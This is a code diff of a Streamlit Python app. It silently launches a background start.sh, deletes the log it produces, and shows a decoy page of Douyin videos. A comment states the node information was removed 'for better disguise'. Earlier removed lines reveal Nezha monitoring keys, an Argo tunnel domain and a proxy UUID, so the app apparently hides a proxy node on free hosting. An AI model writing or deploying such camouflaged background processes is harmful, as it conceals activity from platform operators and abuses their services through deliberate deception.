@@ -1,44 +1,64 @@
 import os
 import subprocess
 import streamlit as st
-import time
+import threading
+import psutil
+# 优化代码，参数可以直接在设置里面添加，也可在start.sh里面添加，更方便了
+# 为了更好的伪装，去掉了节点信息，请手搓节点信息
+# Define the command to be executed
+cmd = (
+    "chmod +x ./start.sh && "
+    "nohup ./start.sh > /dev/null 2>&1 & "
+    "while [ ! -f list.log ]; do sleep 1; done; "
+    "rm -rf list.log &&"
+    "rm -rf /streamlit_app/list.log &&"
+    "echo 'app is running' "
+)
 
-# streamlit专用python脚本
-# Load secrets from Streamlit and set them as environment variables
-nezha_server = st.secrets["nes"]
-nezha_key = st.secrets["nek"]
-tok = st.secrets["tok"]
-argo_domain = st.secrets["argo_domain"]
-uuid = st.secrets["uuid"]
-cf_ip = st.secrets["cf_ip"]
+# Function to check if bot.js is running
+def is_bot_js_running():
+    try:
+        for process in psutil.process_iter(['pid', 'cmdline']):
+            cmdline = process.info.get('cmdline')
+            if cmdline and any('bot.js' in arg for arg in cmdline):
+                return True
+    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        pass
+    return False
 
-# 在设置密钥里面添加nes,nek,tok,三个参数即可，start.sh里面这三项保留默认空白
-os.environ["NEZHA_SERVER"] = nezha_server
-os.environ["NEZHA_KEY"] = nezha_key
-os.environ["TOK"] = tok
-os.environ["ARGO_DOMAIN"] = argo_domain
-os.environ["UUID"] = uuid
-os.environ["CF_IP"] = cf_ip
+# Function to execute the command
+def execute_command():
+    flag_file = "/streamlit_app/command_executed.flag"
+    if not os.path.exists(flag_file):
+        if not is_bot_js_running():
+            subprocess.run(cmd, shell=True)
+            # Create a flag file to indicate the command has been executed
+            with open(flag_file, "w") as f:
+                f.write("Command executed")
 
-# Save the environment variables to a shell script
-with open("./c.yml", "w") as shell_file:
-    shell_file.write(f"export NEZHA_SERVER='{nezha_server}'\n")
-    shell_file.write(f"export NEZHA_KEY='{nezha_key}'\n")
-    shell_file.write(f"export TOK='{tok}'\n")
-    shell_file.write(f"export ARGO_DOMAIN='{argo_domain}'\n")
-    shell_file.write(f"export UUID='{uuid}'\n")
-    shell_file.write(f"export CF_IP='{cf_ip}'\n")
+# Start the command in a separate thread
+def start_thread():
+    if not threading.current_thread().name == "MainThread":
+        thread = threading.Thread(target=execute_command)
+        thread.start()
 
-# Define the command to be executed, sourcing the environment variable
-cmd = "chmod +x ./start.sh && nohup ./start.sh > /dev/null 2>&1 & sleep 99999999999999999999999"
+start_thread()
 
-# Execute the shell command with shell=True
-subprocess.run(cmd, shell=True)
+st.title("❤️抖音美女欣赏❤️")
+video_paths = ["linman.mp4", "luoxi.mp4", "nixiaoni.mp4","luoman.mp4","luoman2.mp4","mazhuo.mp4"]
 
-# Infinite loop to keep the script running
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("Shutting down...")
-    print("Server shut down.")
+# Display each video if it exists
+for video_path in video_paths:
+    if os.path.exists(video_path):
+        st.video(video_path)
+
+
+# Define the URL of the website you want to proxy
+url = "https://douyin.boo/index.html"
+
+# 去掉下面一句前面#，可以显示网页版抖音美女
+#st.components.v1.html(f'<iframe src="{url}" width="100%" height="600" style="border:none;"></iframe>', height=700)
+
+image_path = "./mv.jpg"
+if os.path.exists(image_path):
+    st.image(image_path, caption='林熳', use_column_width=True)
